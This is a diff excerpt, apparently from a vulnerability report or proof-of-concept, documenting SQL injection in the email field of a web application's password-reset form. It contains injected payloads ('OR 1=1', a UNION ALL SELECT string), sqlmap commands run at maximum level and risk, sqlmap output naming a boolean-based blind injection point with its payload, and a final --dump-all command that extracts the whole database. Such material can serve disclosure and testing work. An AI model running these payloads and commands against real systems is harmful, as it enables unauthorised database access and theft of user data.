@@ -54,3 +54,18 @@ test@test.com'OR 1=1#
 
 We have e-mailed your password reset link to test@test.com' UNION ALL SELECT CONCAT(CONCAT('qkkvq','SsMsrUtUtBOZqfjQbqGOMEfxpgarcMCWKDbcjgei'),'qzbxq'),NULL,NULL,NULL,NULL,NULL,NULL,NULL-- sVBF
 
+saved the request in file and let the sqlmap run on the file
+
+sqlmap :
+sqlmap -r <filename> --level=5 --risk=3 --batch --threads=5
+
+[17:16:36] [WARNING] the web server responded with an HTTP error code (419) which could interfere with the results of the tests
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: email (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
+    Payload: _token=gFmrQITTLBM5LsN8gAXvJoubJ9XVQuJTomDg8UOO&email=test' AND 7478=(SELECT (CASE WHEN (7478=7478) THEN 7478 ELSE (SELECT 8104 UNION SELECT 5551) END))-- -
+
+sqlmap -r <filename> --dbms=mysql --dump-all --threads=5
+
